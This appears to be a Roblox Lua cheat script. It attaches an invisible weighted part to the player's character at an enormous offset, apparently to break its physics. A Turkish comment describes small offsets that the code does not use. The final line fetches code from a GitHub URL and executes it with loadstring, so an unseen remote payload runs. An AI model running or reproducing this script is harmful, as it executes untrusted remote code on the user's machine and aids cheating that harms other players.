local lp = game.Players.LocalPlayer
local char = lp.Character or lp.CharacterAdded:Wait()
local hrp = char:WaitForChild("HumanoidRootPart")

local old = char:FindFirstChild("FakeCOM")
if old then old:Destroy() end

local comPart = Instance.new("Part")
comPart.Name = "FakeCOM"
comPart.Size = Vector3.new(1,1,1)
comPart.Transparency = 1
comPart.CanCollide = false
comPart.Anchored = false
comPart.Massless = false
comPart.CustomPhysicalProperties = PhysicalProperties.new(4, 0.3, 0.5, 1, 1)
comPart.Parent = char

local weld = Instance.new("WeldConstraint")
weld.Part0 = hrp
weld.Part1 = comPart
weld.Parent = comPart

-- Karakterin merkezine göre: 0 sağ/sol, 4 birim aşağı, 4 birim arkası
comPart.CFrame = hrp.CFrame * CFrame.new(-999999999999999999999999999999999999999999999999, -9999999999999999999999999999999999999999999999, -9999999999999999999999999999999999999999999999999999999999999999)

wait(1.5)

loadstring(game:HttpGet("https://raw.githubusercontent.com/Key-System-User/Scripts/refs/heads/main/lol.md"))()
